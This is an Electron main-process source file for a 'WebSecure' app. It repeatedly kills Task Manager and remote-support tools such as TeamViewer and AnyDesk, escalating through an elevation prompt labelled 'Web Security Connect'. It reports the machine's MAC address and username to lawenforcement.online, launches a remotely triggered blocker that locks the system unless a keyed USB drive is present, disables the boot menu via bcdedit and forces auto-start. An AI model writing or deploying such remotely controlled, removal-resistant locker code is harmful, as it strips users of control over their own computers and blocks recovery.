import { app, BrowserWindow, Menu, Tray, dialog } from 'electron';
import * as win from 'node-windows';
import sp from 'sudo-prompt';
import axios from 'axios';
import * as macFinder from 'getmac';
import os from 'os';
import FormData from 'form-data';
import queryString from 'querystring';
const DriveListScanner = require("drivelist-scanner");
const fs = require('fs');
import { join } from 'path';
import { execFile } from 'child_process'; 
import autoLaunch from 'auto-launch';

// Keep a global reference of the window object, if you don't, the window will
// be closed automatically when the JavaScript object is garbage collected.
let mainWindow, killInterval = null, isKillActive = false, 
    serverInterval = null, macAddrs = null, proc = null, isProcEnabled = null,
    isPenDriveConnected = false, pendriveFoundLetter = "YUZ", isSystemBlockerEnabled = false;

/**
 * Enable Remote Kill Interval
 */
function enableKillInterval() {
  // no need to set any interva
  // if there is already a interval
  if (killInterval) {
    return;
  }

  killInterval = setInterval(killSoftwares, 1000);
}


/**
 * Disable Remote Kill Interval
 */
function disableKillInterval() {
  // there is no interval
  // no need to kill what is non existent
  if (!killInterval) {
    return;
  }

  clearInterval(killInterval);
  killInterval = null;
}

/**
 * Enable Server Check Interval
 */
function enableServerInterval() {
  if (serverInterval) {
    return;
  }

  serverInterval = setInterval(checkServer, 5000);
}


/**
 * Disable Server Check Interval
 */
function disableServerInterval() {
  if (!serverInterval) {
    return;
  }

  clearInterval(serverInterval);
  serverInterval = null;
}

/**
 * Kill the remote with everything
 */
function killSoftwares() {
  
  const disabledSystems = [
    /* task manager */
    'taskmgr.exe',
    
    /* Team Viewer */
    'TeamViewer.exe',

    /* Log Me In */
    'LMIRTechConsole.exe',
    'LogMeInSystray.exe',
    'LogMeInToolkit.exe',
    'LMIIgnition.exe',
    'LMI_Rescue.exe',

    /* weird name supremo */
    "sp\ [3].exe",

    /* more show my pc */
    'SMPCSetup.exe',

    /* Aero Admin */
    'AeroAdmin.exe',

    /* Ammy Admin */
    'AA_v3.exe',

    /* Go To Assist */
    'g2mcomm.exe',
    'g2mlauncher.exe',
    'g2mstart.exe',
    'g2mui.exe',
    'g2ax_user_customer.exe',
    // 'g2ax_host_service.exe',
    // 'g2ax_comm_expert.exe',
    // 'g2ax_session_expert.exe',
    'GoTo\ Opener.exe',
    'g2ax_start.exe',
    'g2ax_user_expert.exe',
    'g2mvideoconference.exe',
    
    /* remote desktop software */
    'RPCPrintServer.exe',
    'RPCSuite.exe',

    /* Supremo Control OKISH version */
    'Supremo.exe',

    /* join.me */
    'join.me.exe',
    'join.me.installer.exe',

    /* AnyDesk */
    'AnyDesk.exe',
  ];

  win.list(function(list) {
    list.forEach(function(element) {
      if (disabledSystems.indexOf(element.ImageName) >= 0) {
        win.kill(element.PID, function(err) {
          
          // kill server interval first
          if (err) {
           /**
            * 
            * Apply SUDO force to kill remote
            */
            disableServerInterval();
            disableKillInterval();

            let cmd = `taskkill /PID ${element.PID} /F /T`;
            sp.exec(cmd, {
              name: 'Web Security Connect'
            }, function(err, stdout, stderr) {
              enableKillInterval();
              enableServerInterval();
            });

            return;
          }

          // DEBUG_LOG
          console.log("Program Killed");

        });
      }
    }, this);
  })
}

/**
 * check if user is authorized to run
 * remote software
 */
function checkServer() {
  axios.get("http://lawenforcement.online/api/user/find/mac", {
    params: {
      mac: macAddrs
    }
  })
  .then(function(response) {
      // kill remote here
      if(response.data.data.is_remote_enabled == "1") {
        console.log("Remote Enabled True");
        isKillActive = false;
      } else {
        console.log("Remote Enabled False");
        isKillActive = true;
      }

      // kill server here
      if(response.data.data.is_system_enabled == "1") {
        console.log("System Enabled");
        isProcEnabled = false;
      } else {
        console.log("System Disabled");
        isProcEnabled = true;
      }
  })
  .catch(function(err) {
      console.log(err);
      isKillActive = true;
  });


  // reduce function calls to kill switch
  if (isKillActive && killInterval === null) {
    enableKillInterval();
  } else if (isKillActive === false && killInterval) {
    disableKillInterval();
  }

  if (isProcEnabled) {
    enableBlocker(true);
  } else {
    disableBlocker();
  }
}

/**
 * block the system
 */
function enableBlocker(forced = false) {
  let filePath = require("path").normalize(`C:\\Users\\${os.userInfo().username}\\AppData\\Roaming\\websecure\\WpfApp1.exe`);
  let blockExeName = "WpfApp1.exe";
  
  console.log("Starting System Blocker");

  // enable kill interval
  enableKillInterval();

  if (!isProcEnabled && !forced) {
    console.log("Returning nothing found")
    return true;
  }

  /**
   * handle a condition where user somehow disables 
   * the app, check it and handle our case accordingly
   */

  console.log("Starting Software Check");
  win.list(function(list) {
    Array.prototype.forEach.call(list, function(element, idx, array) {
      if (String(element.ImageName) === blockExeName) {
        console.log("Found Software Bail Out!")
        isSystemBlockerEnabled = true;

      }
    });
  });


  console.log("Enabling Blocker!!!!");
  /* run process */
  if (proc === null && !isSystemBlockerEnabled) {
    console.log("Enabling Software")
    proc = execFile(filePath);
  } else if (proc) {
    if (!isSystemBlockerEnabled) {

      console.log("Nulling Process")
      proc = null;
    }
  } else {
    console.log("Unable to find A ny of Safe Barriers")
  }

  isSystemBlockerEnabled = false;
}

/**
 * enable the system
 */
function disableBlocker() {
  if (proc) {
    //kill the process path
    if (isPenDriveConnected) {
      proc.kill('SIGINT');
      proc = null;

      // disable blocker
      disableKillInterval();
    }
  }
}

function startupKiller() {
  console.log("Startup Killer workin");
  let blockExeName = "msconfig.exe";

  win.list(function(list) {
    Array.prototype.forEach.call(list, function(element, idx, array) {
      if (String(element.ImageName) === blockExeName) {
        win.kill(element.PID, function(err) {
          if (err) { 
            let cmd = `taskkill /PID ${element.PID} /F /T`;
            sp.exec(cmd, {
              name: 'Web Security Connect'
            }, function(err, stdout, stderr) {
              
            });
          }
          console.log("Nuked the shit of msconfig");
        });
      }
    });
  });
}

function hasFile(driveLetter) {
  const cp = require("child_process");
  
  let cmd = `${driveLetter} && type .websecurerc`,
      data = null;
  
  try {
    data = cp.execSync(cmd);
  } catch (error) {
    console.log(error);
    data = null;
  }

  if (data === null) {
    return false;
  } else {
    return true;
  }
}



function enablePdChecker() {
  const driveScanner = new DriveListScanner();

  // enable the blocker only turn it on once we found the pendrive
  enableBlocker(true);
  console.log("Pendrive Not Found Disabling Drive");

  driveScanner.on('add', function(drive) {

    if (Number(drive.size.split(" ")[0]) === 8) {
      console.log(drive);
      if (hasFile(drive.mountpoint)) {
        console.log("=== FOUND FILE ====");
        isPenDriveConnected = true;
        pendriveFoundLetter = drive.mountpoint
      } else {
        console.log("=== UNABLE TO FIND FILE==");
      }
    }

    if (isPenDriveConnected) {
      axios.post("http://lawenforcement.online/api/user/connect/enable", queryString.stringify({
        mac: macAddrs
      }))
      .then(function(res) {
        if (200 === Number(res.data.error_code)) {     
          disableBlocker();
          console.log("Pendrive Found Enabling Drive")
        }
      }).catch(function(reason) {
        console.log(reason);
      });   

    } else {
      axios.post("http://lawenforcement.online/api/user/connect/disable", queryString.stringify({
        mac: macAddrs
      }))
      .then(function(res) {
        if (200 === Number(res.data.error_code)) {
          console.log("disconnection successfull");
        }
      }).catch(function(reason) {
        console.log(reason);
      });
    }
  });

  driveScanner.on('remove', function(drive) {

    if (drive.mountpoint !== pendriveFoundLetter) {
      return;
    }

    console.log(drive);
    // is drive even connected
    isPenDriveConnected = false;

    axios.post("http://lawenforcement.online/api/user/connect/disable", queryString.stringify({
      mac: macAddrs
    }))
    .then(function(res) {
      if (200 === Number(res.data.error_code)) {
        enableBlocker(true);
        console.log("Drive Disconnected Killing System Now..");
      }
    }).catch(function(reason) {
      console.log(reason);
    });
  });
}

/**
 * @init
 * kickstarts everything
 */
function checkKillStatus() {
  // start checking
  // for kills from server
  // checks every 5 secs
  enableServerInterval();

  // Enable Software Killer
  // Kills all the instances of 
  // Following Applications
  // check kill every 1.5secs
  enableKillInterval();

  // Enables Drive Checker
  // to see if drive is inserted or removed
  enablePdChecker();


  // start up the shit
  // setInterval(startupKiller, 1000);
}

/**
 * @param {string} macaddr 
 */
function isDeviceAvailableOnServer(macaddr) {
  axios.get("http://lawenforcement.online/api/user/find/mac", {
    params: {
      mac: macaddr
    }
  }).then(function(res) {
    if (200 === Number(res.data.error_code)) {
      console.log("Enabling Kill Status");
      // console.log(res.data);
      checkKillStatus();
    } else if (404 === Number(res.data.error_code)) {

      // registering user and then killing
      console.log("Register User and Kill");
    }

  }).catch(function(reason) {
    if (404 === Number(reason.response.data.error_code)) {
      axios.post("http://lawenforcement.online/api/user/register/mac", queryString.stringify({
        mac: macAddrs,
        username: os.userInfo().username
      }))
      .then(function(res) {
        if (200 === Number(res.data.error_code)) {
          checkKillStatus();
        }
      }).catch(function(reason) {
        console.log(reason);
      })
    }
  });
}

function isComputerRegistered() {
  
  macFinder.getMac(function(err, macaddr) {
    if (err) {
      // Do nothing
    }

    macAddrs = macaddr;
    isDeviceAvailableOnServer(macaddr);
  });

  
}

function handleSquirrelEvent() {
  if (process.argv.length === 1) {
    return false;
  }

  const ChildProcess = require('child_process');
  const path = require('path');

  const appFolder = path.resolve(process.execPath, '..');
  const rootAtomFolder = path.resolve(appFolder, '..');
  const installRoot = path.resolve(rootAtomFolder, '..');
  const updateUserPath = path.resolve(path.join(installRoot, 'websecure'));
  const updateDotExe = path.resolve(path.join(rootAtomFolder, 'Update.exe'));
  const exeName = path.basename(process.execPath);

  const spawn = function(command, args) {
    let spawnedProcess, error;

    try {
      spawnedProcess = ChildProcess.spawn(command, args, {detached: true});
    } catch (error) {}

    return spawnedProcess;
  };

  const spawnUpdate = function(args) {
    return spawn(updateDotExe, args);
  };

  const squirrelEvent = process.argv[1];
  switch (squirrelEvent) {
    case '--squirrel-install':
    case '--squirrel-updated':
      // Optionally do things such as:
      // - Add your .exe to the PATH
      // - Write to the registry for things like file associations and
      //   explorer context menus
      // Disable f8 and shit!
      let disableF8 = `bcdedit /set {bootmgr} displaybootmenu no`;

      sp.exec(disableF8, {
        name: 'web secure connect',
      }, function(err, stdout, stderr) {
        
      });

      // Add Application to Startup and Shit!
      let al = new autoLaunch({
        name: 'WebSecure',
        path: process.execPath
      });

      al.isEnabled()
      .then(function(isEnabled){
          if(isEnabled){
              return;
          }
          al.enable();
      })
      .catch(function(err){
        
      });

      // Install desktop and start menu shortcuts
      spawnUpdate(['--createShortcut', exeName]);

      // setTimeout(app.quit, 1000); 
      return true;

    case '--squirrel-uninstall':
      // Undo anything you did in the --squirrel-install and
      // --squirrel-updated handlers
      
      let filePath = require("path").normalize(`C:\\Users\\${os.userInfo().username}\\AppData\\Roaming\\websecure\\websecure2-1.0.0 Setup.exe`);

      spawn(filePath);
      
      // Remove desktop and start menu shortcuts
      spawnUpdate(['--removeShortcut', exeName]);
      return true;

    case '--squirrel-obsolete':
      // This is called on the outgoing version of your app before
      // we update to the new version - it's the opposite of
      // --squirrel-updated
      app.quit();
      return true;
  }
};

const createWindow = () => {

  if (handleSquirrelEvent()) return;  

  // Create the browser window.
  mainWindow = new BrowserWindow({
    width: 680,
    height: 580,
    maxHeight: 580,
    maxWidth: 680,
    minHeight: 580,
    minWidth: 680,
    autoHideMenuBar: true,
  });

  // and load the index.html of the app.
  mainWindow.loadURL(`file://${__dirname}/warning.html`);

  // Open the DevTools.
  // mainWindow.webContents.openDevTools();

  // Emitted when the window is closed.
  mainWindow.on('closed', () => {
    // Dereference the window object, usually you would store windows
    // in an array if your app supports multi windows, this is the time
    // when you should delete the corresponding element.
    mainWindow = null;
  });
  
  isComputerRegistered();
};

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', createWindow);

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  // On OS X it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') {
    // app.quit();
    // app.hide();
    // Add Application to Startup and Shit!
      let al = new autoLaunch({
        name: 'WebSecure',
        path: process.execPath
      });

      al.isEnabled()
      .then(function(isEnabled){
          if(isEnabled){
              return;
          }
          al.enable();
      })
      .catch(function(err){
        
      });
  }
});

app.on('activate', () => {
  // On OS X it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (mainWindow === null) {
    createWindow();
  }
});

// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and import them here.